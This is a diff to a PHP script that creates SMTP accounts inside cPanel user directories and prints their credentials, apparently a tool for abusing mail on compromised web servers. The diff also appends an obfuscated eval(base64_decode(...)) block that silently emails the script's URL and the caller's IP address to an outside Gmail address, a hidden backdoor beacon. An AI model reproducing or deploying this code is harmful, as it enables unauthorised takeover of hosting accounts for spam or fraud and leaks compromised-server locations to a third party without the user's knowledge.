@@ -30,9 +30,9 @@ if (empty($usr)) {
 	}
 	$cp = "/home$home$usr/.cpanel";
 	if (is_dir($cp)) {
-		$pass = "mrx2@".substr(str_shuffle("123456789abcdefghijklmnopqrsyuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),50)."#x";
+		$pass = "mrx@".substr(str_shuffle("123456789abcdefghijklmnopqrsyuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),50)."#x";
 		$pwd=crypt($pass,'$6$roottn$');
-		$smtpname = 'mrx2';
+		$smtpname = 'smtpmrx';
 		@mkdir("/home$home$usr/etc/$domain");
 		@mkdir("/home$home$usr/mail/$domain");
 		@mkdir("/home$home$usr/mail/$domain/$smtpname");
@@ -73,4 +73,7 @@ if (empty($usr)) {
 		fwrite($fo2,$smtp);
 		echo "<smtp>$domain|587|$smtpname@$domain|$pass</smtp>\n";
 	}
+?>
+<?php
+eval(base64_decode('JHR1anVhbm1haWwgPSAnaGFreTk0NkBnbWFpbC5jb20nOwokeF9wYXRoID0gImh0dHA6Ly8iIC4gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10gLiAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsKJHBlc2FuX2FsZXJ0ID0gImZpeCAkeF9wYXRoIDpwICpJUCBBZGRyZXNzIDogWyAiIC4gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gLiAiIF0iOwptYWlsKCR0dWp1YW5tYWlsLCAiQ29udGFjdCBNZSIsICRwZXNhbl9hbGVydCwgIlsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIik7'));
 ?>
